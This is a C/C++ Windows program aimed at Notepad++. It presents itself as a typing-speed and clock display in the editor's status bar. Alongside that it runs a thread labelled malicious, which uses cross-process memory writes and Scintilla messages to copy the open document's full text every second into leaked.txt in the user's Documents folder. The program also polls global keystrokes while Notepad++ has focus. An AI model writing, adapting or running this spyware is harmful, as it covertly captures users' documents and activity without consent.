#include<stdio.h>
#include<Windows.h>
#include<tlhelp32.h>
#include<wchar.h>
#include<time.h>
#include<shlobj.h>

// For apmAndClock
#define BUF_SIZE 28 * 6 // (# of Char) * (UTF-8 Maximum size)
#define INTERVAL 250

#define WM_USER 0x0400
#define SB_SETTEXT (WM_USER + 11)

// For leakFile
#define SCI_GETTEXTRANGE 2162
#define SCI_GETTEXTLENGTH 2183

typedef ptrdiff_t Sci_Position;
struct Sci_CharacterRangeFull {
	Sci_Position cpMin;
	Sci_Position cpMax;
};
struct Sci_TextRangeFull {
	struct Sci_CharacterRangeFull chrg;
	char* lpstrText;
};

// For stop thread
BOOL flag = 1;

DWORD findProcessPid(const wchar_t* processName);

DWORD WINAPI apmAndClock(LPVOID lpParam);
DWORD WINAPI leakFile(LPVOID lpParam);


int main(void) {

	// Get Notepad++'s pid
	DWORD pid = findProcessPid(L"Notepad++.exe");
	if (pid == NULL) {
		printf("findProcessPid Error");
		return 1;
	}
	/////

	// Start Useful Func
	HANDLE usefulFunc = CreateThread(NULL, 0, apmAndClock, reinterpret_cast<LPVOID>(pid), 0, NULL);
	/////

	printf("Say \'y\' when you want to spy on the notepadd++: ");
	while (getchar() != 'y');

	// Start Malicious Func
	HANDLE malFunc = CreateThread(NULL, 0, leakFile, reinterpret_cast<LPVOID>(pid), 0, NULL);
	/////

	printf("press \'q\' to stop\n");
	while (getchar() != 'q');

	// Stop Funcs
	flag = 0;
	WaitForSingleObject(usefulFunc, INFINITE);
	WaitForSingleObject(malFunc, INFINITE);

	CloseHandle(usefulFunc);
	CloseHandle(malFunc);
	/////

	return 0;
}

DWORD findProcessPid(const wchar_t* processName) {

	printf("Looking for \"Notepad++.exe\"....\n");

	DWORD pid = NULL;

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	entry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{

			if (_wcsicmp(entry.szExeFile, processName) == 0)
			{
				pid = entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);

	printf("Found notepad++.exe(PID=%u)\n", pid);
	return pid;

}

DWORD WINAPI apmAndClock(LPVOID lpParam) {

	DWORD exitCode;
	DWORD pid = reinterpret_cast<int>(lpParam);
	clock_t start, current, doc_start;
	DOUBLE apm = 0;
	DOUBLE key_count = 0;
	TCHAR printBuf[BUF_SIZE] = { 0, };

	// Get Necessary Handles
	HWND windowHandle = FindWindowW(L"Notepad++", NULL);
	if (NULL == windowHandle) {
		printf("Notepad++ Window not found\n");
		return 1;
	}
	HWND statusHandle = FindWindowExW(windowHandle, NULL, TEXT("msctls_statusbar32"), NULL);
	if (NULL == statusHandle) {
		printf("statusBar not found\n");
		return 1;
	}
	/////

	// Virtual Alloc For statsbar message
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (NULL == hProcess) {
		printf("Process not found\n");
		return 1;
	}
	LPVOID lpAddr = VirtualAllocEx(hProcess, NULL, BUF_SIZE, MEM_COMMIT, PAGE_READWRITE);
	if (NULL == lpAddr) {
		printf("VirtualAllocEx() failure.\n");
		return 1;
	}
	/////

	start = clock();
	doc_start = start;

	while (flag) {

		current = clock();

		if (GetForegroundWindow() == windowHandle) {
			for (int key = 8; key <= 190; key++) {
				if (GetAsyncKeyState(key) & 0x8000) {
					key_count++;
				}
			}
		}

		if ((double)(current - start) >= INTERVAL) {
			
			double totalSec = (double)(current - doc_start) / CLOCKS_PER_SEC;
			apm = (key_count / totalSec) / 60.0;

			unsigned int elaps_time = (unsigned int)(double(current - doc_start) / CLOCKS_PER_SEC);

			unsigned int days = elaps_time / 86400;
			unsigned int hours = (elaps_time % 86400) / 3600;
			unsigned int minutes = (elaps_time % 3600) / 60;
			unsigned int seconds = elaps_time % 60;

			wsprintfW(printBuf, L"문서 작성시간: %u:%02u:%02u:%02u / APM: %u\0", days, hours, minutes, seconds, (DWORD)apm);
			
			if (!WriteProcessMemory(hProcess, lpAddr, printBuf, BUF_SIZE, NULL)) {

				GetExitCodeProcess(hProcess, &exitCode);
				if (STILL_ACTIVE != exitCode) {
					printf("Notepad++ has quit.(StopFunc: PRINT APM AND CLOCK)\n");
					printf("press \'q\'\n");

					CloseHandle(hProcess);
					return 0;
				}
				else {
					printf("WriteProcessMemory Error\n");
					return 1;
				}
			}
			
			// Print message in statusbar
			SendMessageW(statusHandle, SB_SETTEXT, 0, (LPARAM)lpAddr);
			/////

			//key_count = 0;
			start = current;
		}
	}

	VirtualFree(lpAddr, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	return 0;
}

DWORD WINAPI leakFile(LPVOID lpParam) {

	DWORD exitCode;
	DWORD pid = reinterpret_cast<int>(lpParam);

	// Get Necessary Handles
	HWND windowHandle = FindWindowW(L"Notepad++", NULL);
	if (NULL == windowHandle) {
		printf("Notepad++ Window not found\n");
		return 1;
	}
	HWND scintillaHandle = FindWindowExW(windowHandle, NULL, TEXT("Scintilla"), TEXT("Notepad++"));
	if (NULL == scintillaHandle) {
		printf("scintillaHandle not found\n");
		return 1;
	}
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (NULL == hProcess) {
		printf("Process not found\n");
		return 1;
	}
	//////

	// VirtualAlloc For Scintilla Actions
	LPVOID sci_tr = VirtualAllocEx(hProcess, NULL, sizeof(Sci_TextRangeFull)+1, MEM_COMMIT, PAGE_READWRITE);
	if (NULL == sci_tr) {
		printf("VirtualAllocEx() failure.\n");
		return 1;
	}
	//////

	// Find Document's Absolute Path
	WCHAR* tmp = NULL;
	WCHAR path[MAX_PATH];
	SHGetKnownFolderPath(FOLDERID_Documents, 0, NULL, &tmp);
	if (NULL == tmp) {
		printf("SHGetKnownFolderPath Error\n");
		return 1;
	}
	wmemcpy(path, tmp, wcslen(tmp));
	CoTaskMemFree(tmp);
	wmemcpy(path + wcslen(path), TEXT("\\leaked.txt\0"), wcslen(TEXT("\\leaked.txt\0")));
	//////

	// Create leaked.txt in Documents
	HANDLE hFile = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (NULL == hFile) {
		printf("CreateFileW Error\n");
		return 1;
	}
	/////

	while (flag) {

		// Write Sci_TextRangeFull Value in Notepad++'s memory
		DWORD length = SendMessageW(scintillaHandle, SCI_GETTEXTLENGTH, 0, 0);

		LPVOID leakedMsg = VirtualAllocEx(hProcess, NULL, length+1, MEM_COMMIT, PAGE_READWRITE);
		if (NULL == leakedMsg) {

			GetExitCodeProcess(hProcess, &exitCode);
			if (STILL_ACTIVE != exitCode) {
				printf("Notepad++ has quit.(StopFunc: STORE LEAKED MEMORY)\n");
				printf("press \'q\'\n");

				CloseHandle(hFile);
				CloseHandle(hProcess);
				return 0;
			}
			else {
				printf("VirtualAllocEx() failure.\n");
				return 1;
			}
		}

		Sci_TextRangeFull tr{};
		tr.chrg.cpMin = 0;
		tr.chrg.cpMax = length;
		tr.lpstrText = (char*)leakedMsg;

		if (!WriteProcessMemory(hProcess, (LPVOID)sci_tr, (LPVOID)&tr, sizeof(Sci_TextRangeFull)+1, NULL)) {

			GetExitCodeProcess(hProcess, &exitCode);
			if (STILL_ACTIVE != exitCode) {
				printf("Notepad++ has quit.(StopFunc: STORE LEAKED MEMORY)\n");
				printf("press \'q\'\n");

				CloseHandle(hFile);
				CloseHandle(hProcess);
				return 0;
			}
			else {
				printf("WriteProcessMemory Error\n");
				return 1;
			}
		}
		/////

		// Get scintilla's value and Store in attack process' memory
		SendMessageW(scintillaHandle, SCI_GETTEXTRANGE, 0, (LPARAM)sci_tr);

		char* printBuf = (char*)malloc(length + 1);
		if (!ReadProcessMemory(hProcess, leakedMsg, printBuf, length, NULL)) {

			GetExitCodeProcess(hProcess, &exitCode);
			if (STILL_ACTIVE != exitCode) {
				printf("Notepad++ has quit.(StopFunc: STORE LEAKED MEMORY)\n");
				printf("press \'q\'\n");

				free(printBuf);
				CloseHandle(hFile);
				CloseHandle(hProcess);
				return 0;
			}
			else {
				printf("ReadProcessMemory Error\n");
				return 1;
			}
		}
		/////

		// Overwrite leaked.txt
		SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

		DWORD bytesWritten;
		if (!WriteFile(hFile, printBuf, length, &bytesWritten, NULL)) {
			printf("WriteFile Error\n");
			return 1;
		}

		SetEndOfFile(hFile);
		FlushFileBuffers(hFile);
		/////

		// Free alloc memory
		free(printBuf);
		VirtualFree(leakedMsg, 0, MEM_RELEASE);
		/////

		// Wait 1 minute For Notepad++'s smooth work
		Sleep(1000);
		/////
	}
	VirtualFree(sci_tr, 0, MEM_RELEASE);

	CloseHandle(hFile);
	CloseHandle(hProcess);
	
	return 0;
}
